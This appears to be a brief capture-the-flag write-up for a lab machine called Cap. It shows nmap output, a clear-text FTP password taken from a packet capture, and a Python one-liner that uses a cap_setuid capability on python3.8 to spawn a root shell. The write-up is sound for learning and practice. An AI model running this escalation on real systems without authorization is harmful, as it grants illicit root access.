# Cap Write-Up

Easy

Tags: 
`IDOR Exploitation`
`Packet Capture Analysis`
`Clear Text Credentials`
`SUID Exploitation`

## Intro

1. Use wireshark to capture packet
2. linpeas.sh to escalate privilege

## Exploit

### Port scanning

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    gunicorn
```

### Use `WireShark`

username: `nathan`
password: `Buck3tH4TF0RM3`

Connect ssh

## Privilege Escalation

Use `linpeas.sh`

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Search [/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip](https://useful.adindrabkin.com/hacker-mode/linux-privilege-escalation-checklist)

```
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```